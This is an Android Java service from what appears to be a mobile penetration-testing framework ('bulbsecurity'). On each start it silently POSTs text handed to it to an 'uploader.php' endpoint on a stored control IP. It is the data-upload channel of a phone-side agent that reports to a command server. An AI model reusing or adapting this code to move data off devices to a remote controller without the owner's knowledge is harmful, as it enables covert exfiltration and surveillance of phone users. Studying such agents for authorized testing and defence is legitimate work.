package com.bulbsecurity.framework.app;


import java.io.ByteArrayOutputStream;

import java.util.ArrayList;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.IBinder;



public class WebUploadService3 extends Service {

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		
	}
	
	@Override
	public void onStart(Intent intent, int startID) {
		final String uploadstring = intent.getStringExtra("uploadstring");
		final String controlIP = ((FrameworkAndroidApp) this.getApplication()).getcontrolIP();
		//final String path = ((FrameworkAndroidApp) this.getApplication()).getpath();
		new Thread() {
				public void run() {
		
					String aString[] = uploadstring.split(" ");
					String port = aString[1];
					String controlpath = aString[0];
					String uploadbody = "---";
					if (aString.length > 2)
					{
					uploadbody = aString[2];
					
					for (int j = 3; j < aString.length; j++)
					{
						uploadbody += " ";
						uploadbody += aString[j];
					}
					}
					
				
					
			ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
			nameValuePairs.add(new BasicNameValuePair("text", uploadbody));
			try{
				HttpClient httpclient = new DefaultHttpClient();
				String http = "http://";
				String slash = "/";
				String url = "uploader.php";
				String uri = http.concat(controlIP);
				String postto1 = uri.concat(controlpath);
				String posty = postto1.concat(slash);
				String posty2 = posty.concat(port);
				String postto = posty2.concat(url);
				HttpPost httppost = new HttpPost(postto);
				httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
				httpclient.execute(httppost);
				//HttpEntity entity = response.getEntity();
				//InputStream input = entity.getContent();
				}catch(Exception e){

				e.printStackTrace();

				}
				};
			}.start();
}
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

}
